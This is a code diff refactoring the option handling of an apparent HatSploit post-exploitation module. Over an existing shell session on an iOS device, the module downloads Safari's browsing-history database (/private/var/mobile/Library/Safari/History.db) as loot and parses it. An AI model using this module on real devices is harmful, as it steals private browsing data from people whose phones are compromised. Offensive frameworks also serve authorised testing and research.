@@ -4,7 +4,7 @@ Current source: https://github.com/EntySec/HatSploit
 """
 
 from hatsploit.lib.loot import Loot
-from hatsploit.lib.module import Module
+from hatsploit.lib.module.basic import *
 from hatsploit.lib.sessions import Sessions
 from pex.db import DB
 
@@ -25,26 +25,14 @@ class HatSploitModule(Module, Sessions, DB):
             'Rank': "medium",
         }
 
-        self.options = {
-            'SESSION': {
-                'Description': "Session to run on.",
-                'Value': None,
-                'Type': {'session': {'Platforms': ['apple_ios'], 'Type': 'shell'}},
-                'Required': True,
-            },
-            'PATH': {
-                'Description': "Path to save file.",
-                'Value': Loot().specific_loot('History.db'),
-                'Type': None,
-                'Required': True,
-            },
-        }
+        self.session = SessionOption(None, "Session to run on.", True,
+                                     platforms=['apple_ios'], type='shell')
+        self.path = Option(Loot().specific_loot('History.db'), "Path to save file.", True)
 
     def run(self):
-        session, path = self.parse_options(self.options)
         history = '/private/var/mobile/Library/Safari/History.db'
+        path = self.session_download(self.session.value, history, self.path.value)
 
-        path = self.session_download(session, history, path)
         if path:
             self.print_process("Parsing history database...")
 
